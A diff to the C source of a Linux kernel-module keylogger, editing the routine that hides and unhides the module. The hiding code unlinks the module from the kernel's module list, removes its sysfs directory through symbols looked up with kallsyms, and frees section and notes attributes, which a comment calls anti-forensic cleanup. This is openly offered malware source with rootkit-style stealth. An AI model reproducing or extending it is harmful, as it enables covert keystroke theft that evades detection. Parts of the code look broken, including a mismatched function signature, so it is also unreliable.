@@ -20,7 +20,6 @@
 #define BUFF_SIZE (PAGE_SIZE << 2)
 #define DEVICE_NAME "Keylogger"
 
-
 /*Vars for keystroke & strings save*/
 static char msg_Ptr[BUFF_SIZE];
 static size_t buf_pos;
@@ -47,6 +46,7 @@ int is_hide = 0;
 
 /*define the syfs_remove_dir func*/
 void (*sysfs_remove_fir_orig)(struct kobject *);
+void (*sysfs_create_fir_orig)(struct kobject *);
 
 
 /*file opersion for hideing and unhide the module*/
@@ -55,7 +55,8 @@ int dev_open_fops_for_hide(struct inode *inode, struct file* file)
 {
     static struct list_head *module_list;
     struct kobject* saved_kobj_parent;
-    sysfs_remove_fir_orig = (void *)module_kallsyms_lookup_name("sysfs_remove_dir");
+    sysfs_remove_fir_orig = (void *)kallsyms_lookup_name("sysfs_remove_dir");
+    sysfs_create_fir_orig = (void *) kallsyms_lookup_name("sysfs_create_dir_ns");
     if (!is_hide)
     {
         /*wait to get mutex*/
@@ -64,7 +65,7 @@ int dev_open_fops_for_hide(struct inode *inode, struct file* file)
         module_list = THIS_MODULE->list.prev;
         saved_kobj_parent = THIS_MODULE->mkobj.kobj.parent;
         list_del_init(&THIS_MODULE->list);//remove form the modules linked list
-        sysfs_remove_dir(&THIS_MODULE->mkobj.kobj);//remove the specific dir (not the object from the module)
+        sysfs_remove_fir_orig(&THIS_MODULE->mkobj.kobj);//remove the specific dir (not the object from the module)
         kfree(THIS_MODULE->sect_attrs);/*clean informasion for anti forensic*/
         kfree(THIS_MODULE->notes_attrs);/*using kfree to clean*/
         THIS_MODULE->notes_attrs = NULL;/* and then puts, NULL to seve the setings */
@@ -78,8 +79,7 @@ int dev_open_fops_for_hide(struct inode *inode, struct file* file)
         while (!mutex_trylock(&module_mutex))
             cpu_relax();
         list_add(&THIS_MODULE->list, module_list);
-        kobject_add(&THIS_MODULE->mkobj.kobj ,saved_kobj_parent, "rt");//need to fix
-        kobject_put(&THIS_MODULE->mkobj.kobj);// need to fix
+        sysfs_create_fir_orig(saved_kobj_parent);
         is_hide=0;
         
         mutex_unlock(&module_mutex);
